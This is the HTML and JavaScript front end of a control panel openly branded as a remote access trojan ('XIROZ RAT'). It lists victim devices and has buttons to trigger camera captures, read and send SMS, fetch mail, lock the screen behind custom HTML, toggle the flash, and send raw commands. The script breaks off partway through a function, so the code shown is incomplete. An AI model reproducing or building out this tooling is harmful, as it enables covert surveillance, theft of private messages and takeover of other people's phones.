<!DOCTYPE html>
<html class="light" lang="id">
<head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>XIROZ · RAT Control</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23D94F14' stroke-width='2'><circle cx='12' cy='12' r='10'/><path d='M12 2v20M2 12h20'/></svg>"/>
  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>

  <script>
    tailwind.config = {
      darkMode: "class",
      theme: {
        extend: {
          colors: {
            cream: "#F7F7F5",
            surface: "#FFFFFF",
            ink: "#1A1A1A",
            "ink-soft": "#6B6B6B",
            "ink-lighter": "#A0A0A0",
            border: "#E7E7E4",
            "border-soft": "#F0EFEC",
            accent: "#D94F14",
            success: "#4ADE80",
            "success-bg": "#F0FDF4",
            warn: "#FBBF24",
            "warn-bg": "#FFFBEB",
            error: "#F87171",
            "error-bg": "#FEF2F2"
          },
          fontFamily: { sans: ["Geist", "sans-serif"] },
          borderRadius: {
            DEFAULT: "0.75rem",
            lg: "1rem",
            xl: "1.5rem",
            "2xl": "2rem",
            full: "9999px"
          },
          boxShadow: {
            soft: "0 4px 24px rgba(0,0,0,0.04)",
            card: "0 2px 16px rgba(0,0,0,0.03)",
            auralis: "0 8px 48px rgba(0,0,0,0.06), 0 2px 12px rgba(0,0,0,0.02)"
          },
          animation: {
            "fade-up": "fadeUp 0.5s ease both",
            "fade-in": "fadeIn 0.4s ease both",
            "slide-up": "slideUp 0.3s ease both",
            "pop-in": "popIn 0.35s cubic-bezier(0.34,1.56,0.64,1) both"
          },
          keyframes: {
            fadeUp: { "0%": { opacity: "0", transform: "translateY(12px)" }, "100%": { opacity: "1", transform: "translateY(0)" } },
            fadeIn: { "0%": { opacity: "0" }, "100%": { opacity: "1" } },
            slideUp: { "0%": { opacity: "0", transform: "translateY(8px)" }, "100%": { opacity: "1", transform: "translateY(0)" } },
            popIn: { "0%": { opacity: "0", transform: "translateY(-10px) scale(0.94)" }, "100%": { opacity: "1", transform: "translateY(0) scale(1)" } }
          }
        }
      }
    }
  </script>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Geist', sans-serif; background: #F7F7F5; color: #1A1A1A; -webkit-font-smoothing: antialiased; }

    .dot-sm { width: 6px; height: 6px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
    .dot-sm.ok { background: #4ADE80; animation: blink 1.2s ease-in-out infinite; }
    .dot-sm.pending { background: #D4D4D0; }
    .dot-sm.err { background: #F87171; }
    @keyframes blink { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.4; transform:scale(.85); } }

    .btn-primary {
      position: relative;
      background: #1A1A1A;
      color: #fff;
      border: none;
      border-radius: 9999px;
      padding: 7px 18px;
      font-weight: 600;
      font-size: 12.5px;
      cursor: pointer;
      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      box-shadow: 0 2px 14px rgba(0,0,0,0.06);
      min-width: 80px;
    }
    .btn-primary:hover { box-shadow: 0 6px 26px rgba(0,0,0,0.10); transform: translateY(-1px); }
    .btn-primary:active { transform: scale(0.97); }
    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    .btn-primary.accent { background: #D94F14; }
    .btn-primary.accent:hover { background: #B84010; }
    .btn-primary.outline { background: transparent; color: #1A1A1A; border: 1px solid #E7E7E4; }
    .btn-primary.outline:hover { background: #FAFAF9; box-shadow: none; }
    .btn-primary.sm { padding: 4px 12px; font-size: 11px; min-width: auto; }

    .notification {
      position: fixed;
      top: 78px;
      right: 20px;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-width: 380px;
      width: 100%;
      pointer-events: none;
    }
    .notif-item {
      pointer-events: auto;
      background: #fff;
      border-radius: 1.1rem;
      padding: 14px 16px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.09), 0 2px 10px rgba(0,0,0,0.03);
      border: 1px solid #F0EFEC;
      display: flex;
      align-items: flex-start;
      gap: 12px;
      animation: popIn 0.35s cubic-bezier(0.34,1.56,0.64,1) both;
      position: relative;
      overflow: hidden;
    }
    .notif-item.exit { animation: notifOut 0.28s ease forwards; }
    @keyframes notifOut { to { opacity: 0; transform: translateX(24px) scale(0.95); } }
    .notif-icon {
      flex-shrink: 0;
      width: 34px;
      height: 34px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .notif-icon.success { background: #ECFDF3; color: #22C55E; }
    .notif-icon.warn { background: #FFFBEB; color: #F59E0B; }
    .notif-icon.error { background: #FEF2F2; color: #EF4444; }
    .notif-icon svg { width: 17px; height: 17px; }
    .notif-body { flex: 1; min-width: 0; padding-top: 1px; }
    .notif-title { font-weight: 700; font-size: 13.5px; color: #1A1A1A; letter-spacing: -0.1px; }
    .notif-desc { font-size: 12px; color: #6B6B6B; margin-top: 2px; line-height: 1.45; word-break: break-all; }
    .notif-close {
      flex-shrink: 0;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      border: none;
      background: transparent;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #C0C0C0;
      transition: background 0.15s, color 0.15s;
    }
    .notif-close:hover { background: #F0EFEC; color: #1A1A1A; }
    .notif-close svg { width: 12px; height: 12px; }
    .notif-progress { position: absolute; bottom: 0; left: 0; right: 0; height: 2.5px; background: #F5F5F3; }
    .notif-progress .bar { height: 100%; width: 100%; border-radius: 0 0 1.1rem 1.1rem; transition: width 0.1s linear; }
    .notif-progress .bar.success { background: #4ADE80; }
    .notif-progress .bar.warn { background: #FBBF24; }
    .notif-progress .bar.error { background: #F87171; }

    .nav-trigger {
      display: flex;
      align-items: center;
      gap: 7px;
      padding: 7px 14px;
      border-radius: 9999px;
      font-size: 13px;
      font-weight: 500;
      color: #1A1A1A;
      background: #F0EFEC;
      border: none;
      cursor: pointer;
      transition: background 0.2s;
    }
    .nav-trigger:hover { background: #E7E7E4; }
    .nav-trigger svg { width: 16px; height: 16px; }
    .nav-trigger .chev { transition: transform 0.25s; }
    .nav-trigger.open .chev { transform: rotate(180deg); }
    .nav-drop {
      position: absolute;
      top: calc(100% + 8px);
      left: 0;
      background: #fff;
      border: 1px solid #E7E7E4;
      border-radius: 1rem;
      box-shadow: 0 16px 48px rgba(0,0,0,0.10), 0 4px 12px rgba(0,0,0,0.03);
      min-width: 195px;
      padding: 6px;
      z-index: 60;
      display: none;
    }
    .nav-drop.show { display: block; animation: popIn 0.22s cubic-bezier(0.34,1.56,0.64,1) both; }
    .nav-drop a {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 9px 10px;
      border-radius: 0.65rem;
      font-size: 13px;
      font-weight: 500;
      color: #1A1A1A;
      text-decoration: none;
      transition: background 0.15s;
    }
    .nav-drop a:hover { background: #FAFAF9; }
    .nav-drop a svg { width: 16px; height: 16px; color: #6B6B6B; flex-shrink: 0; }
    .nav-drop a.active { background: #FFF5F0; color: #D94F14; }
    .nav-drop a.active svg { color: #D94F14; }
    .nav-drop .sep { height: 1px; background: #F0EFEC; margin: 4px 6px; }

    .device-card {
      background: #FAFAF9;
      border: 1px solid #E7E7E4;
      border-radius: 0.9rem;
      padding: 12px 14px;
      display: flex;
      align-items: center;
      gap: 12px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .device-card:hover { border-color: #D4D4D0; box-shadow: 0 2px 12px rgba(0,0,0,0.04); }
    .device-card.active { border-color: #D94F14; background: #FFFBF8; box-shadow: 0 0 0 3px rgba(217,79,20,0.06); }
    .device-card.online { border-left: 3px solid #4ADE80; }
    .device-card.offline { border-left: 3px solid #D4D4D0; opacity: 0.55; }

    .status-dot {
      display: inline-block;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      flex-shrink: 0;
    }
    .status-dot.online { background: #4ADE80; box-shadow: 0 0 12px rgba(74,222,128,0.3); }
    .status-dot.offline { background: #A0A0A0; }

    .battery-svg { width: 28px; height: 14px; display: inline-block; vertical-align: middle; flex-shrink: 0; }

    .ctrl-group {
      background: #FAFAF9;
      border: 1px solid #E7E7E4;
      border-radius: 1rem;
      padding: 14px 16px;
    }
    .ctrl-group label { font-size: 11px; font-weight: 600; color: #6B6B6B; text-transform: uppercase; letter-spacing: 0.3px; display: block; margin-bottom: 8px; }
    .ctrl-row { display: flex; flex-wrap: wrap; gap: 6px; }
    .ctrl-row .btn-primary { flex: 1; min-width: 60px; }

    .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    @media (max-width: 640px) { .feature-grid { grid-template-columns: 1fr; } }

    .output-area {
      background: #0A0A0A;
      border-radius: 0.75rem;
      padding: 12px 16px;
      max-height: 200px;
      overflow-y: auto;
      font-family: 'Geist', monospace;
      font-size: 11px;
      line-height: 1.8;
      color: #86EFAC;
      border: 1px solid #1A1A1A;
      margin-top: 12px;
    }
    .output-area .ts { color: #4A5568; margin-right: 10px; }
    .output-area .cmd { color: #7AD4FF; }
    .output-area .resp { color: #86EFAC; }
    .output-area .err { color: #FCA5A5; }
    .output-area .sys { color: #B794F4; }

    .input-row {
      display: flex;
      align-items: center;
      background: #FAFAF9;
      border: 1px solid #E7E7E4;
      overflow: hidden;
      border-radius: 0.75rem;
      transition: border-color 0.2s;
    }
    .input-row:focus-within { border-color: #D94F14; box-shadow: 0 0 0 3px rgba(217,79,20,0.06); }
    .input-pre { padding: 8px 12px; background: #F0EFEC; color: #6B6B6B; font-size: 11px; font-weight: 500; white-space: nowrap; flex-shrink: 0; }
    .txt-input { flex: 1; background: transparent; border: none; outline: none; color: #1A1A1A; font-size: 13px; font-weight: 500; padding: 8px 12px; min-width: 0; font-family: 'Geist', sans-serif; }

    .photo-preview { max-width: 180px; max-height: 180px; border-radius: 0.5rem; border: 1px solid #E7E7E4; margin-top: 4px; }

    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.4);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      z-index: 9998;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal-overlay.show { display: flex; }
    .modal-box {
      background: #fff;
      border-radius: 1.5rem;
      border: 1px solid #E7E7E4;
      box-shadow: 0 24px 80px rgba(0,0,0,0.12);
      max-width: 560px;
      width: 100%;
      max-height: 90vh;
      overflow-y: auto;
      padding: 24px;
      animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
    }
    .modal-box textarea { width: 100%; background: #FAFAF9; border: 1px solid #E7E7E4; border-radius: 0.75rem; padding: 10px 12px; font-size: 13px; font-family: 'Geist', monospace; resize: vertical; min-height: 80px; outline: none; transition: border-color 0.2s; }
    .modal-box textarea:focus { border-color: #D94F14; box-shadow: 0 0 0 3px rgba(217,79,20,0.06); }

    ::-webkit-scrollbar { width: 4px; height: 4px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: #D4D4D0; border-radius: 9999px; }
  </style>
</head>
<body>

  <!-- HEADER -->
  <header class="fixed top-0 w-full z-50 bg-white/80 backdrop-blur-xl border-b border-[#E7E7E4]">
    <div class="max-w-[1280px] mx-auto px-6 h-16 flex items-center justify-between">
      <div class="flex items-center gap-4">
        <a href="#" class="flex items-center gap-2 font-bold text-lg tracking-tight hover:opacity-80 transition">XIROZ <span class="text-[#D94F14]">RAT</span></a>
        <div class="relative" id="navWrap">
          <button class="nav-trigger" id="navTrigger" onclick="toggleNav(event)">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
            Menu
            <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
          </button>
          <div class="nav-drop" id="navDrop">
            <a href="#" class="active">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12l9-7 9 7v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V12z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
              Dashboard
            </a>
            <a href="#">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 5v14M5 12h14"/></svg>
              Settings
            </a>
            <div class="sep"></div>
            <a href="#">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 9h6M9 15h4"/></svg>
              Logs
            </a>
          </div>
        </div>
      </div>
      <div class="flex items-center gap-3">
        <span class="text-xs font-medium text-[#6B6B6B] hidden sm:inline-flex items-center gap-1.5">
          <span class="dot-sm ok"></span>
          <span id="statusChip">Ready</span>
        </span>
        <span class="text-xs font-medium text-[#6B6B6B] bg-[#F0EFEC] px-3 py-1 rounded-full" id="adminDevice">Pixel 8</span>
      </div>
    </div>
  </header>

  <!-- NOTIFICATION -->
  <div class="notification" id="notifCont"></div>

  <!-- MAIN -->
  <main class="pt-24 pb-12 px-4 md:px-6 max-w-[1280px] mx-auto flex flex-col gap-6">

    <!-- HERO -->
    <div class="flex flex-col gap-1 animate-fade-up">
      <h1 class="text-3xl md:text-4xl font-bold tracking-tight">RAT Control</h1>
      <p class="text-[#6B6B6B] text-base">Manage connected devices remotely.</p>
    </div>

    <!-- TWO CARDS -->
    <div class="grid grid-cols-1 lg:grid-cols-5 gap-6">

      <!-- CARD 1: DEVICE LIST -->
      <section class="lg:col-span-2 bg-white border border-[#E7E7E4] rounded-2xl p-5 shadow-soft animate-fade-up" style="animation-delay:0.04s">
        <div class="flex items-center justify-between border-b border-[#E7E7E4] pb-4 mb-4">
          <div class="flex items-center gap-3">
            <span class="w-7 h-7 rounded-full bg-[#F0EFEC] flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6B6B6B" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            </span>
            <h2 class="text-lg font-semibold">Devices</h2>
          </div>
          <span class="text-xs font-medium text-[#6B6B6B] bg-[#F0EFEC] px-3 py-1 rounded-full" id="deviceCount">0 online</span>
        </div>

        <div class="flex items-center gap-2 mb-3">
          <div class="input-row flex-1">
            <span class="input-pre">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
            </span>
            <input class="txt-input" id="searchDevices" placeholder="Filter devices..." oninput="renderDevices()"/>
          </div>
          <button class="btn-primary outline sm" onclick="fetchDevices()">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.5 9a9 9 0 0 1 13.6-4.1M20.5 15a9 9 0 0 1-13.6 4.1"/></svg>
          </button>
        </div>

        <div id="deviceList" class="flex flex-col gap-2 max-h-[420px] overflow-y-auto pr-1">
          <div class="text-[#6B6B6B] text-sm py-6 text-center">Loading devices...</div>
        </div>

        <div class="mt-3 pt-3 border-t border-[#E7E7E4] flex justify-between text-xs text-[#6B6B6B]">
          <span id="selectedDeviceLabel">No device selected</span>
          <span id="lastRefresh">--</span>
        </div>
      </section>

      <!-- CARD 2: FEATURES -->
      <section class="lg:col-span-3 bg-white border border-[#E7E7E4] rounded-2xl p-5 shadow-soft animate-fade-up" style="animation-delay:0.08s">
        <div class="flex items-center justify-between border-b border-[#E7E7E4] pb-4 mb-4">
          <div class="flex items-center gap-3">
            <span class="w-7 h-7 rounded-full bg-[#F0EFEC] flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6B6B6B" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
            </span>
            <h2 class="text-lg font-semibold">Controls</h2>
          </div>
          <span class="text-xs font-medium text-[#6B6B6B]" id="selectedDeviceName">none</span>
        </div>

        <!-- Feature Grid -->
        <div class="feature-grid">

          <!-- Flash -->
          <div class="ctrl-group">
            <label>Flash</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="sendFlash('on')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M13 2L3 14h7l-1 8 10-12h-7z"/></svg> On
              </button>
              <button class="btn-primary sm outline" onclick="sendFlash('off')">Off</button>
              <button class="btn-primary sm outline" onclick="sendFlash('blink')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h7l-1 8 10-12h-7z"/><path d="M13 8l-4 6h3l-1 4 6-8h-4z"/></svg> Blink
              </button>
            </div>
          </div>

          <!-- Camera -->
          <div class="ctrl-group">
            <label>Camera</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="sendCamera('back')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg> Back
              </button>
              <button class="btn-primary sm outline" onclick="sendCamera('front')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/><path d="M5 5l4-2M19 5l-4-2"/></svg> Front
              </button>
            </div>
          </div>

          <!-- Lock Screen -->
          <div class="ctrl-group">
            <label>Lock Screen</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="showLockModal()">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Lock
              </button>
              <button class="btn-primary sm outline" onclick="sendUnlock()">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.8-1.4"/></svg> Unlock
              </button>
            </div>
          </div>

          <!-- LCD Effect -->
          <div class="ctrl-group">
            <label>LCD Effect</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="sendLcd('matrix')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3h18v18H3z"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="3" y1="15" x2="21" y2="15"/><line x1="9" y1="3" x2="9" y2="21"/><line x1="15" y1="3" x2="15" y2="21"/></svg> Matrix
              </button>
              <button class="btn-primary sm outline" onclick="sendLcd('scanline')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg> Scanline
              </button>
              <button class="btn-primary sm outline" onclick="sendLcd('off')">Off</button>
            </div>
          </div>

          <!-- SMS -->
          <div class="ctrl-group">
            <label>SMS</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="sendFetchSms()">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg> Fetch
              </button>
              <button class="btn-primary sm outline" onclick="showSmsModal()">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg> Send
              </button>
            </div>
          </div>

          <!-- Mail -->
          <div class="ctrl-group">
            <label>Mail</label>
            <div class="ctrl-row">
              <button class="btn-primary sm" onclick="sendFetchMail()">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 6L12 13 2 6"/><path d="M22 6v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6"/><polyline points="22 6 12 13 2 6"/></svg> Fetch
              </button>
            </div>
          </div>

        </div>

        <!-- Custom command input -->
        <div class="mt-3 pt-3 border-t border-[#E7E7E4]">
          <div class="input-row">
            <span class="input-pre">$</span>
            <input class="txt-input" id="customCmd" placeholder="raw command..." onkeydown="if(event.key==='Enter')sendCustom()"/>
            <button class="btn-primary sm" style="border-radius:0 0.75rem 0.75rem 0;min-width:auto;padding:7px 14px;" onclick="sendCustom()">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
            </button>
          </div>
        </div>

        <!-- Output -->
        <div class="output-area" id="outputArea">
          <div class="sys"><span class="ts">[system]</span> ready — select a device</div>
        </div>
      </section>
    </div>
  </main>

  <!-- FOOTER -->
  <footer class="border-t border-[#E7E7E4] bg-white/50 backdrop-blur-sm mt-4 py-6">
    <div class="max-w-[1280px] mx-auto px-6 flex flex-col sm:flex-row justify-between items-center gap-4 text-sm text-[#6B6B6B]">
      <span class="font-semibold text-[#1A1A1A]">XIROZ <span class="text-[#D94F14]">RAT</span></span>
      <span>&copy; 2026</span>
      <div class="flex gap-6">
        <a href="#" class="hover:text-[#1A1A1A] transition">Privacy</a>
        <a href="#" class="hover:text-[#1A1A1A] transition">Terms</a>
      </div>
    </div>
  </footer>

  <!-- MODALS -->
  <div class="modal-overlay" id="lockModal">
    <div class="modal-box">
      <div class="flex items-center justify-between border-b border-[#E7E7E4] pb-3 mb-4">
        <h3 class="text-lg font-bold">Lock Screen HTML</h3>
        <button class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-[#F0EFEC] transition" onclick="closeModal('lockModal')">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
      </div>
      <textarea id="lockHtmlInput" placeholder="<div style='background:black;color:white;height:100vh;display:flex;align-items:center;justify-content:center;font-size:2rem;'>LOCKED</div>"></textarea>
      <div class="flex gap-3 mt-4">
        <button class="flex-1 px-4 py-2.5 border border-[#E7E7E4] rounded-xl hover:bg-[#FAFAF9] transition font-medium text-sm" onclick="closeModal('lockModal')">Cancel</button>
        <button class="flex-1 px-4 py-2.5 bg-[#1A1A1A] text-white rounded-xl hover:bg-[#2A2A2A] transition font-medium text-sm" onclick="sendLock()">Lock</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="smsModal">
    <div class="modal-box">
      <div class="flex items-center justify-between border-b border-[#E7E7E4] pb-3 mb-4">
        <h3 class="text-lg font-bold">Send SMS</h3>
        <button class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-[#F0EFEC] transition" onclick="closeModal('smsModal')">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
      </div>
      <input id="smsTo" class="w-full bg-[#FAFAF9] border border-[#E7E7E4] rounded-xl px-4 py-2.5 text-sm font-medium focus:outline-none focus:border-[#D94F14] transition mb-3" placeholder="Phone number"/>
      <textarea id="smsBody" class="w-full bg-[#FAFAF9] border border-[#E7E7E4] rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#D94F14] transition resize-y min-h-[60px]" placeholder="Message body"></textarea>
      <div class="flex gap-3 mt-4">
        <button class="flex-1 px-4 py-2.5 border border-[#E7E7E4] rounded-xl hover:bg-[#FAFAF9] transition font-medium text-sm" onclick="closeModal('smsModal')">Cancel</button>
        <button class="flex-1 px-4 py-2.5 bg-[#1A1A1A] text-white rounded-xl hover:bg-[#2A2A2A] transition font-medium text-sm" onclick="sendSms()">Send</button>
      </div>
    </div>
  </div>

  <!-- ===== MAIN SCRIPT ===== -->
  <script>
    'use strict';

    // --- CONFIG ---
    const API_BASE = '/api/index';
    let selectedClient = null;
    let clients = {};
    let lastResultId = {};
    let pollInterval = null;

    const $ = id => document.getElementById(id);
    const escH = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

    // --- NOTIFICATION ---
    let notifId = 0;
    function notify(type, title, message, delay = 4500) {
      delay = Math.min(delay, 5000);
      const c = $('notifCont');
      const icons = {
        success: '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>',
        warn:    '<path d="M12 9v4m0 4h.01"/><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
        error:   '<circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>'
      };
      const colors = {
        success: { bg: '#ECFDF3', icon: '#22C55E', bar: '#4ADE80' },
        warn:    { bg: '#FFFBEB', icon: '#F59E0B', bar: '#FBBF24' },
        error:   { bg: '#FEF2F2', icon: '#EF4444', bar: '#F87171' }
      };
      const c2 = colors[type] || colors.success;
      const el = document.createElement('div');
      el.className = 'notif-item';
      el.innerHTML = `
        <div class="notif-icon ${type}">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">${icons[type]}</svg>
        </div>
        <div class="notif-body">
          <div class="notif-title">${escH(title)}</div>
          <div class="notif-desc">${escH(message)}</div>
        </div>
        <button class="notif-close">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
        <div class="notif-progress"><div class="bar ${type}" style="width:100%"></div></div>`;
      c.appendChild(el);
      const bar = el.querySelector('.bar');
      let pct = 100;
      const iv = setInterval(() => { pct -= 100 / (delay / 100); bar.style.width = Math.max(0, pct) + '%'; if (pct <= 0) clearInterval(iv); }, 100);
      const tm = setTimeout(dismiss, delay);
      function dismiss() { clearTimeout(tm); clearInterval(iv); el.classList.add('exit'); setTimeout(() => el.remove(), 280); }
      el.querySelector('.notif-close').addEventListener('click', dismiss);
    }

    // --- NAV ---
    function toggleNav(e) { e.stopPropagation(); $('navDrop').classList.toggle('show'); $('navTrigger').classList.toggle('open'); }
    document.addEventListener('click', e => { if (!e.target.closest('#navWrap')) { $('navDrop').classList.remove('show'); $('navTrigger').classList.remove('open'); } });

    // --- MODALS ---
    function showModal(id) { $(id).classList.add('show'); }
    function closeModal(id) { $(id).classList.remove('show'); }
    function showLockModal() { if (!selectedClient) { notify('warn', 'No Device', 'Select a device first.'); return; } showModal('lockModal'); }
    function showSmsModal() { if (!selectedClient) { notify('warn', 'No Device', 'Select a device first.'); return; } showModal('smsModal'); }

    // --- BATTERY SVG ---
    function batterySVG(percent) {
      const p = Math.min(100, Math.max(0, percent || 0));
      const color = p > 60 ? '#4ADE80' : p > 25 ? '#FBBF24' : '#F87171';
      const fillWidth = Math.round((p / 100) * 18);
      return `<svg class="battery-svg" viewBox="0 0 28 14" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="0.5" y="0.5" width="23" height="13" rx="2.5" stroke="${color}" stroke-width="1.2" opacity="0.8"/>
        <rect x="24.5" y="3.5" width="2.5" height="7" rx="1" fill="${color}" opacity="0.6"/>
        <rect x="2.5" y="2.5" width="${fillWidth}" height="9" rx="1.5" fill="${color}" opacity="0.85"/>
        ${p < 20 ? `<text x="5" y="10" font-size="6" fill="white" font-weight="600">${Math.round(p)}%</text>` : ''}
      </svg>`;
    }

    // --- OUTPUT ---
    function appendOutput(text, type = 'resp', clientId = null) {
      const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
      const area = $('outputArea');
      const line = document.createElement('div');
      line.className = type;
      const prefix = clientId ? `[${clientId.slice(0,6)}]` : '';
      line.innerHTML = `<span class="ts">${ts}</span>${prefix ? ` <span class="sys">${prefix}</span>` : ''} ${text}`;
      area.appendChild(line);
      area.scrollTop = area.scrollHeight;
      // keep last 100 lines
      while (area.children.length > 100) area.removeChild(area.firstChild);
    }

    // --- API ---
    async function api(action, body = null, method = 'GET') {
      const url = `${API_BASE}?action=${action}`;
      const opts = { method, headers: { 'Content-Type': 'application/json' } };
      if (body) opts.body = JSON.stringify(body);
      const res = await fetch(url, opts);
      if (!res.ok) throw new Error(await res.text());
      return res.json();
    }

    // --- DEVICES ---
    async function fetchDevices() {
      try {
        const data = await api('clients');
        const newClients = {};
        data.forEach(c => { newClients[c.id] = c; });
        clients = newClients;
        renderDevices();
        $('lastRefresh').textContent = new Date().toLocaleTimeString();
      } catch (e) {
        appendOutput(`fetch devices: ${e.message}`, 'err');
      }
    }

    function renderDevices() {
